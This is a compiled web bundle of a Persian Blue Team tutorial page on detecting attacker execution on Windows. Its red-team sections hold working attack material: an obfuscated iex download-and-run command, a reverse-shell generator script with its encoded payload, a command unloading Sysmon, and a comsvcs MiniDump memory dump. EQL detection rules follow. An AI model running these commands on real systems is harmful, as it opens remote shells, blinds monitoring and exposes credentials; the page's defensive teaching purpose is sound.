"use strict";(self.webpackChunktaymaz_docs=self.webpackChunktaymaz_docs||[]).push([[3518],{3905:(e,A,n)=>{n.d(A,{Zo:()=>c,kt:()=>m});var t=n(7294);function a(e,A,n){return A in e?Object.defineProperty(e,A,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[A]=n,e}function l(e,A){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);A&&(t=t.filter((function(A){return Object.getOwnPropertyDescriptor(e,A).enumerable}))),n.push.apply(n,t)}return n}function r(e){for(var A=1;A<arguments.length;A++){var n=null!=arguments[A]?arguments[A]:{};A%2?l(Object(n),!0).forEach((function(A){a(e,A,n[A])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):l(Object(n)).forEach((function(A){Object.defineProperty(e,A,Object.getOwnPropertyDescriptor(n,A))}))}return e}function o(e,A){if(null==e)return{};var n,t,a=function(e,A){if(null==e)return{};var n,t,a={},l=Object.keys(e);for(t=0;t<l.length;t++)n=l[t],A.indexOf(n)>=0||(a[n]=e[n]);return a}(e,A);if(Object.getOwnPropertySymbols){var l=Object.getOwnPropertySymbols(e);for(t=0;t<l.length;t++)n=l[t],A.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var s=t.createContext({}),i=function(e){var A=t.useContext(s),n=A;return e&&(n="function"==typeof e?e(A):r(r({},A),e)),n},c=function(e){var A=i(e.components);return t.createElement(s.Provider,{value:A},e.children)},p="mdxType",u={inlineCode:"code",wrapper:function(e){var A=e.children;return t.createElement(t.Fragment,{},A)}},d=t.forwardRef((function(e,A){var n=e.components,a=e.mdxType,l=e.originalType,s=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),p=i(n),d=a,m=p["".concat(s,".").concat(d)]||p[d]||u[d]||l;return n?t.createElement(m,r(r({ref:A},c),{},{components:n})):t.createElement(m,r({ref:A},c))}));function m(e,A){var n=arguments,a=A&&A.mdxType;if("string"==typeof e||a){var l=n.length,r=new Array(l);r[0]=d;var o={};for(var s in A)hasOwnProperty.call(A,s)&&(o[s]=A[s]);o.originalType=e,o[p]="string"==typeof e?e:a,r[1]=o;for(var i=2;i<l;i++)r[i]=n[i];return t.createElement.apply(null,r)}return t.createElement.apply(null,n)}d.displayName="MDXCreateElement"},8944:(e,A,n)=>{n.r(A),n.d(A,{assets:()=>s,contentTitle:()=>r,default:()=>u,frontMatter:()=>l,metadata:()=>o,toc:()=>i});var t=n(7462),a=(n(7294),n(3905));const l={},r="Execution",o={unversionedId:"BT/Detecting Execution",id:"BT/Detecting Execution",title:"Execution",description:"\u062f\u0631 \u0627\u06cc\u0646 \u0628\u062e\u0634 \u0628\u0647 \u0628\u0631\u0631\u0633\u06cc \u062d\u0644\u0642\u0647 \u0647\u0627\u06cc \u06af\u0645\u0634\u062f\u0647 \u062f\u0631 \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u06a9\u0647 \u062a\u0648\u0633\u0637 \u0646\u0641\u0648\u0630 \u06af\u0631 \u0627\u062c\u0631\u0627 \u0648 \u0627\u0632 \u062f\u06cc\u062f\u06af\u0627\u0647 SOC \u0645\u062e\u0641\u06cc \u0645\u06cc \u0645\u0627\u0646\u062f \u0645\u06cc \u067e\u0631\u062f\u0627\u0632\u06cc\u0645 \u0627\u0645\u06a9\u0627\u0646 \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f \u0647\u0627\u06cc \u0645\u062e\u0631\u0628 \u062a\u0648\u0633\u0637 \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u067e\u06cc\u0634 \u0641\u0631\u0636\u06cc \u06a9\u0647 \u062f\u0631 \u0633\u06cc\u0633\u062a\u0645 \u0639\u0627\u0645\u0644 \u0648\u06cc\u0646\u062f\u0648\u0632 \u0648 \u0644\u06cc\u0646\u0648\u06a9\u0633 \u0648\u062c\u0648\u062f \u062f\u0627\u0631\u062f \u0627\u0632 \u062c\u0645\u0644\u0647 \u0645\u0648\u0627\u0631\u062f\u06cc \u0645\u06cc \u0628\u0627\u0634\u062f \u06a9\u0647 \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u0622\u0646 \u0628\u0631\u0627\u06cc \u0648\u0627\u062d\u062f SOC \u0633\u062e\u062a \u0648 \u062f\u0634\u0648\u0627\u0631 \u0645\u06cc \u0628\u0627\u0634\u062f",source:"@site/docs/BT/9- Detecting Execution.md",sourceDirName:"BT",slug:"/BT/Detecting Execution",permalink:"/docs/BT/Detecting Execution",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/BT/9- Detecting Execution.md",tags:[],version:"current",sidebarPosition:9,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Event Query Language - EQL",permalink:"/docs/BT/EQL-SIEM"},next:{title:"Privilege Escalation Detection",permalink:"/docs/BT/Detecting PE"}},s={},i=[{value:"Windows Scripting",id:"windows-scripting",level:2},{value:"RedTeam Perspective",id:"redteam-perspective",level:3},{value:"Attack Simulation",id:"attack-simulation",level:4},{value:"BlueTeam Perspective",id:"blueteam-perspective",level:3},{value:"EQL Rule",id:"eql-rule",level:3},{value:"Signed Binary",id:"signed-binary",level:2},{value:"RedTeam Perspective",id:"redteam-perspective-1",level:3},{value:"blueTeam Perspective",id:"blueteam-perspective-1",level:3},{value:"EQL Rule",id:"eql-rule-1",level:3},{value:"Native API",id:"native-api",level:2},{value:"RedTeam Perspective",id:"redteam-perspective-2",level:3},{value:"BlueTeam Perspective",id:"blueteam-perspective-2",level:3},{value:"KQL",id:"kql",level:3}],c={toc:i},p="wrapper";function u(e){let{components:A,...l}=e;return(0,a.kt)(p,(0,t.Z)({},c,l,{components:A,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"execution"},"Execution"),(0,a.kt)("alert",{lang:"fa",type:"info",title:"\u0628\u0631\u0631\u0633\u06cc \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f\u0647\u0627\u06cc \u0645\u062e\u0631\u0628"},"\u062f\u0631 \u0627\u06cc\u0646 \u0628\u062e\u0634 \u0628\u0647 \u0628\u0631\u0631\u0633\u06cc \u062d\u0644\u0642\u0647 \u0647\u0627\u06cc \u06af\u0645\u0634\u062f\u0647 \u062f\u0631 \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u06a9\u0647 \u062a\u0648\u0633\u0637 \u0646\u0641\u0648\u0630 \u06af\u0631 \u0627\u062c\u0631\u0627 \u0648 \u0627\u0632 \u062f\u06cc\u062f\u06af\u0627\u0647 SOC \u0645\u062e\u0641\u06cc \u0645\u06cc \u0645\u0627\u0646\u062f \u0645\u06cc \u067e\u0631\u062f\u0627\u0632\u06cc\u0645 \u0627\u0645\u06a9\u0627\u0646 \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f \u0647\u0627\u06cc \u0645\u062e\u0631\u0628 \u062a\u0648\u0633\u0637 \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u067e\u06cc\u0634 \u0641\u0631\u0636\u06cc \u06a9\u0647 \u062f\u0631 \u0633\u06cc\u0633\u062a\u0645 \u0639\u0627\u0645\u0644 \u0648\u06cc\u0646\u062f\u0648\u0632 \u0648 \u0644\u06cc\u0646\u0648\u06a9\u0633 \u0648\u062c\u0648\u062f \u062f\u0627\u0631\u062f \u0627\u0632 \u062c\u0645\u0644\u0647 \u0645\u0648\u0627\u0631\u062f\u06cc \u0645\u06cc \u0628\u0627\u0634\u062f \u06a9\u0647 \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u0622\u0646 \u0628\u0631\u0627\u06cc \u0648\u0627\u062d\u062f SOC \u0633\u062e\u062a \u0648 \u062f\u0634\u0648\u0627\u0631 \u0645\u06cc \u0628\u0627\u0634\u062f"),(0,a.kt)("h2",{id:"windows-scripting"},"Windows Scripting"),(0,a.kt)("fa",null,(0,a.kt)("div",{dir:"auto"},(0,a.kt)("h6",null,"\u0646\u0641\u0648\u0630 \u06af\u0631 \u0627\u0632 \u062f\u0633\u062a\u0648\u0631\u0627\u062a \u067e\u06cc\u0634 \u0641\u0631\u0636 \u0633\u06cc\u0633\u062a\u0645 \u0639\u0627\u0645\u0644 \u0628\u0631\u0627\u06cc \u062c\u0645\u0639 \u0622\u0648\u0631\u06cc \u0627\u0637\u0644\u0627\u0639\u0627\u062a \u060c \u062a\u063a\u06cc\u06cc\u0631 \u062a\u0646\u0638\u06cc\u0645\u0627\u062a \u0633\u06cc\u0633\u062a\u0645 \u060c \u0628\u0627\u06cc \u067e\u0633 \u06a9\u0631\u062f\u0646 \u0645\u06a9\u0627\u0646\u06cc\u0632\u0645 \u0647\u0627\u06cc \u0627\u0645\u0646\u06cc\u062a\u06cc \u0648 \u0627\u0633\u062a\u062e\u0631\u0627\u062c \u0627\u0637\u0644\u0627\u0639\u0627\u062a \u0627\u0633\u062a\u0641\u0627\u062f\u0647 \u0645\u06cc \u06a9\u0646\u062f"))),(0,a.kt)("h3",{id:"redteam-perspective"},"RedTeam Perspective"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-cmd"},"c:\\>p^o^we^rs^hell\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'c:\\>p^o^w""er""s^hell\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"powershell.exe /encode JwBuAG8AbwByAGEAbgBlAHQALgBjAG8AbQAnAA==\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'p^o^w""e""rs^he""l""l.exe /encode JwBuAG8AbwByAGEAbgBlAHQALgBjAG8AbQAnAA==\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'powershell.exe -nop iex "\\"Write-Host `\\"$((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/rastidoust/BlueTeam/main/readme.txt\'))`\\"\\""\n')),(0,a.kt)("h4",{id:"attack-simulation"},"Attack Simulation"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"python3 rshell.py 192.168.1.249 6666\n")),(0,a.kt)("p",null,"rshell.py"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python3\nimport sys\nimport base64\n\ndef help():\n    print("USAGE: %s IP PORT" % sys.argv[0])\n    print("Returns reverse shell PowerShell base64 encoded cmdline payload connecting to IP:PORT")\n    exit()\n\ntry:\n    (ip, port) = (sys.argv[1], int(sys.argv[2]))\nexcept:\n    help()\n\n# https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\n\npayload = \'$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\'\npayload = payload % (ip, port)\n\ncmdline = "powershell -e " + base64.b64encode(payload.encode(\'utf16\')[2:]).decode()\n\nprint(cmdline)\n')),(0,a.kt)("p",null,"Execute Payload"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAyADQAOAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'p^o^w""e""r""sh""ell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAyADQAOAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\n')),(0,a.kt)("alert",{lang:"fa",type:"note",title:"\u0628\u0631\u0631\u0633\u06cc \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f\u0647\u0627\u06cc \u0645\u062e\u0631\u0628"},"\u062f\u0631 \u06a9\u0644\u06cc\u0647 \u0631\u0648\u0634 \u0647\u0627\u06cc \u0630\u06a9\u0631 \u0634\u062f\u0647 \u0646\u0641\u0648\u0630 \u06af\u0631 \u062f\u0633\u062a\u0648\u0631 \u0627\u062c\u0631\u0627\u06cc\u06cc \u0648 \u0622\u0631\u06af\u0648\u0645\u0627\u0646 \u0647\u0627\u06cc \u0622\u0646 \u0631\u0627 \u0628\u0647 \u0634\u06a9\u0644\u06cc \u0627\u062c\u0631\u0627 \u0645\u06cc \u06a9\u0646\u062f \u06a9\u0647 \u0627\u0632 \u062f\u06cc\u062f\u06af\u0627\u0647 \u0633\u06cc\u0633\u062a\u0645 \u0645\u0627\u0646\u06cc\u062a\u0648\u0631\u06cc\u0646\u06af \u0645\u062e\u0641\u06cc \u0628\u0645\u0627\u0646\u062f \u0648 \u062f\u0631 \u0627\u06cc\u0646 \u062d\u0627\u0644\u062a \u062a\u06cc\u0645 \u0622\u0628\u06cc \u0628\u0627\u06cc\u062f \u062d\u0627\u0644\u062a \u0645\u062e\u062a\u0644\u0641 \u0631\u0627 \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc \u0648 \u062f\u0631 \u0642\u0627\u0644\u0628 Rule  \u0647\u0627\u06cc \u0645\u062e\u062a\u0644\u0641 \u0628\u0647 \u0633\u06cc\u0633\u062a\u0645 \u0645\u0627\u0646\u06cc\u062a\u0648\u0631\u06cc\u0646\u06af \u0627\u0636\u0627\u0641\u0647 \u06a9\u0646\u062f"),(0,a.kt)("h3",{id:"blueteam-perspective"},"BlueTeam Perspective"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Event ID 4688 : Process Creation")),(0,a.kt)("p",null,"with command-line argument logging enabled is the best native source of telemetry for detecting malicious use of the Windows Command Shell "),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"Sysmon Event ID 1: Process creation")),(0,a.kt)("p",null,"Sysmon process creation events are another rich source of telemetry for detecting adversarial abuse of the command shell"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"powershell Channel Event ID")),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"400 : PS Activity Start")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"403 : PS Activity Stop")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("p",{parentName:"li"},"600 : PS Provider Start"))),(0,a.kt)("h3",{id:"eql-rule"},"EQL Rule"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-sql"},'GET /winlogbeat-8.2.0/_eql/search\n{\n  "query": """\n   process where process.name == "powershell.exe" and process.args_count > 2  and process.args : ("-e" , "-en" , "-enc" , "-encode")\n  """\n}\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process where process.args_count > 2 \nand\nprocess.args : ("-e" , "-en" , "-enc" , "-encode")\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"process == cmd.exe\nand \nprocess.args : ('^' , '=' , '%' , '!' , '[' , '(' , ';' , ' ')\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"final Rules\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process where process.name : ("powershell.exe" , "cmd.exe")\nand \nprocess.args_count > 2 \nand \nprocess.args : ("^" , "=" , "%" , "!" , "[" ,"(" , ";" , "-e" , "-en" , "-enc" , "-encode","invoke-expression", "-nop" , "iex", "downloadstring" ,"downloadfile")\n')),(0,a.kt)("h2",{id:"signed-binary"},"Signed Binary"),(0,a.kt)("p",null,"Adversaries abuse Rundll32 in many ways, but we commonly observe the following generic patterns of behavior:"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"using legitimate functions to bypass application control solutions"),(0,a.kt)("li",{parentName:"ul"},"abusing legitimate DLLs or export functions to perform malicious actions"),(0,a.kt)("li",{parentName:"ul"},"executing malicious, adversary-supplied DLLs"),(0,a.kt)("li",{parentName:"ul"},"renaming or relocating legitimate DLLs and using them for malicious purposes")),(0,a.kt)("h3",{id:"redteam-perspective-1"},"RedTeam Perspective"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"odbcconf"),"\ncommand-line tool that allows you to configure ODBC drivers and data source names"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"odbcconf /A {REGSVR c:\\temp\\nooranet.dll}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"makecab"),"\nPackage existing files into a cabinet (.cab) file"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"makecab nss.dll nooranet\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"verclsid"),"\nsed to verify a COM object before it is instantiated by Windows Explorer"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"verclsid.exe /S /C {00000001-0000-0000-0000-0000FEEDACDC}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"xwizard"),"\nExecute custom class that has been added to the registry or download a file"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"fltmc")),(0,a.kt)("p",null,"Load or unload a Filter driver"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"fltMC.exe unload SysmonDrv\n")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"rundll32")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"rundll32.exe pcwutl.dll,LaunchApplication C:\\Windows\\System32\\notepad.exe\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 7084 memory.dmp full\n")),(0,a.kt)("h3",{id:"blueteam-perspective-1"},"blueTeam Perspective"),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"Sysmon Event ID 7 : Image loaded")),(0,a.kt)("p",null,"logs all DLL loads. It is also disabled by default because it generates a large amount of noise. Tuning will be critical if you hope to operationalize this data source in any meaningful way. That said, it can provide detailed context about the malicious DLL an adversary executed, including its file hash and directory."),(0,a.kt)("h3",{id:"eql-rule-1"},"EQL Rule"),(0,a.kt)("p",null,"Example-1"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process where process.parent.name == "rundll32.exe"\nand \nprocess.args != null\n')),(0,a.kt)("p",null,"Example-2"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'process  where process.name == rundll32.exe\nand\nprocess.command_line : ("MiniDump" , "ShellExec_RunDLL" , "OpenURL" , "FileProtocolHandler" , "PrintHTML")\n')),(0,a.kt)("p",null,"Example-3"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-sql"},'process  where process.name in~ ( "rundll32.exe", "odbcconf", "makecab", "verclsid.exe", "xwizard", "fltMC.exe")\nand user.name not in~ ("system")\n')),(0,a.kt)("h2",{id:"native-api"},"Native API"),(0,a.kt)("alert",{lang:"fa",type:"info",title:"\u0628\u0631\u0631\u0633\u06cc \u0627\u062c\u0631\u0627\u06cc \u06a9\u062f\u0647\u0627\u06cc \u0645\u062e\u0631\u0628"},"\u0646\u0641\u0648\u0630\u06af\u0631 \u0645\u06cc \u062a\u0648\u0627\u0646\u06cc\u0645 \u0627\u0632 \u0641\u0627\u0646\u06a9\u0634\u0646 \u0647\u0627\u06cc\u06cc \u06a9\u0647 \u0628\u0631\u0627\u06cc \u0646\u0633\u062e\u0647 \u0647\u0627\u06cc \u0642\u0628\u0644\u06cc \u0648\u06cc\u0646\u062f\u0648\u0632 \u0628\u0648\u062f\u0647 \u0627\u0646\u062f \u0648 \u0645\u0633\u062a\u0646\u062f\u0627\u062a \u06a9\u0627\u0645\u0644\u06cc \u0646\u062f\u0627\u0631\u0646\u062f \u0627\u0633\u062a\u0641\u0627\u062f\u0647 \u06a9\u0646\u062f \u06a9\u0647 \u0627\u0635\u0637\u0644\u0627\u062d\u0627 \u0628\u0647 \u0622\u0646 \u0647\u0627 Native API  \u0645\u06cc \u06af\u0648\u06cc\u0646\u062f \u0634\u0646\u0627\u0633\u0627\u06cc\u06cc Native API  \u0647\u0627 \u062a\u0648\u0633\u0637 \u0633\u06cc\u0633\u062a\u0645 \u0647\u0627\u06cc \u0645\u0627\u0646\u06cc\u062a\u0648\u0631\u06cc\u0646\u06af \u0648 \u062d\u062a\u06cc EDR \u0645\u0634\u06a9\u0644 \u0645\u06cc \u0628\u0627\u0634\u062f"),(0,a.kt)("h3",{id:"redteam-perspective-2"},"RedTeam Perspective"),(0,a.kt)("p",null,"use API in Powershell "),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},"function NooraNet-Copy\n\n{\n    [CmdletBinding()]\n\n    [OutputType([System.IO.FileSystemInfo])]\n\n    Param (\n\n        [Parameter(Mandatory = $True, Position = 0)]\n\n        [ValidateNotNullOrEmpty()]\n\n        [String]\n\n        $Path,\n\n        [Parameter(Mandatory = $True, Position = 1)]\n\n        [ValidateNotNullOrEmpty()]\n\n        [String]\n\n        $Destination,\n\n        [Switch]\n\n        $FailIfExists\n\n    )\n\n    $MethodDefinition = @'\n\n    [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]\n\n    public static extern bool CopyFile(string lpExistingFileName, string lpNewFileName, bool bFailIfExists);\n\n'@\n\n    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru\n\n    $CopyResult = $Kernel32::CopyFile($Path, $Destination, ([Bool] $PSBoundParameters['FailIfExists']))\n\n    if ($CopyResult -eq $False)\n\n    {\n\n        throw ( New-Object ComponentModel.Win32Exception )\n    }\n    else\n\n    {\n        Write-Output (Get-ChildItem $Destination)\n    }\n}\n")),(0,a.kt)("p",null,"use native API Call to start process"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-powershell"},'function Nooranet-CreateProcess {\n    param (\n        [Parameter(Mandatory = $True)]\n        [string]$Binary,\n        [Parameter(Mandatory = $False)]\n        [string]$Args=$null,\n        [Parameter(Mandatory = $True)]\n        [string]$CreationFlags,\n        [Parameter(Mandatory = $True)]\n        [string]$ShowWindow,\n        [Parameter(Mandatory = $True)]\n        [string]$StartF\n    )  \n\n    # Define all the structures for CreateProcess\n    Add-Type -TypeDefinition @"\n    using System;\n    using System.Diagnostics;\n    using System.Runtime.InteropServices;\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct STARTUPINFO\n    {\n        public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;\n        public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;\n        public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;\n        public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct SECURITY_ATTRIBUTES\n    {\n        public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;\n    }\n\n    public static class ntdll\n    {\n        [DllImport("ntdll.dll", SetLastError=true)]\n        public static extern bool NtCreateUserProcess(\n            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, \n            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, \n            IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, \n            out PROCESS_INFORMATION lpProcessInformation);\n    }\n"@\n\n    # StartupInfo Struct\n    $StartupInfo = New-Object STARTUPINFO\n    $StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag\n    $StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow\n    $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size\n\n    # ProcessInfo Struct\n    $ProcessInfo = New-Object PROCESS_INFORMATION\n\n    # SECURITY_ATTRIBUTES Struct 